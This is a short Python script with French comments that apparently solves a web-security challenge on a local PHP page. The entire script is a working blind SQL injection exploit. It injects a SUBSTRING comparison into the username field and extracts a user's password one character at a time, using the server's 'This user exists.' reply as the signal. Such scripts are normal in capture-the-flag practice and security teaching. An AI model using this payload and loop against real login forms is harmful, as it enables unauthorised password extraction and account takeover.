import requests
import string
from urllib.parse import quote

# URL du challenge
url = "http://localhost/index.php"

# Authentification HTTP (remplace par le mot de passe que tu as)
auth = ('user', 'password')

# Caractères possibles (on ajoute aussi '-' et '_' au cas où)
charset = string.ascii_letters + string.digits + "-_"

password = ""
position = 1

while True:
    found = False
    for c in charset:
        # Injection SQL : on teste si le caractère à la position 'position' vaut 'c'
        payload = f'" OR username="user" AND BINARY SUBSTRING(password, {position}, 1) = "{c}" -- -'
        
        # Envoi de la requête POST (les données sont automatiquement encodées)
        r = requests.post(url, data={"username": payload}, auth=auth)
        
        # Si le serveur répond "This user exists.", la condition est vraie
        if "This user exists." in r.text:
            password += c
            print(f"Position {position}: trouvé '{c}' -> mot de passe partiel : {password}")
            found = True
            break
    
    if not found:
        # Aucun caractère n'a fonctionné : on a terminé
        print(f"Mot de passe complet : {password}")
        break
    
    position += 1
